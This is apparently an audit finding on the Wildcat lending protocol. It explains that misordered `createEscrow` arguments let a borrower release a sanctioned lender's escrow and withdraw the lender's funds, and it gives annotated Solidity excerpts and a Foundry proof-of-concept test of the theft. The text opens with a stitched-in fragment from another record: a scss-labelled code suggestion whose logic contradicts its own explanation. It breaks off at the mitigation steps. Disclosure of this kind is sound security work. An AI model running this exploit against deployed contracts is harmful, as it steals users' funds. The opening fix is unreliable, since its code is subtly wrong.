This could be done by adding an additional conditional statement within the if-else block, such as:\n```scss\nif (account.approval != AuthRole.Blocked && account.scaledBalance <= 0) {\n    // set approval to blocked and send funds to escrow\n} else {\n    revert(\"Attempted to block account with excess balance\");\n}\n```\nThis would ensure that the smart contract does not allow a borrower to withdraw an excess amount from their account by setting their `approval` value to `AuthRole.Blocked`.",

It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. \n\nThat means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n## Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited.\n\n1. Bob The Borrower creates a market.\n2. Bob authorizes Larry The Lender as a lender in the created market.\n3. Larry deposits funds into the market\n4. Larry gets sanctioned in Chainalysis\n5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` \n8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`\n9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability.\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       \u2193\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit \u2190 Larry\n\tborrower,       //@audit \u2190 Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit \u2190 Larry\n\taddress account,  //@audit \u2190 Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            \u2193         \u2193       \u2193\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     \u2191        \u2191       \u2191   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert:\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         \u2193         \u2193\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               \u2193                 \u2193\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        \u2193       \u2193\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit.\n\nTo proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n## Tools Used\n\nManual review\n## Recommended Mitigation Steps\n\n1.
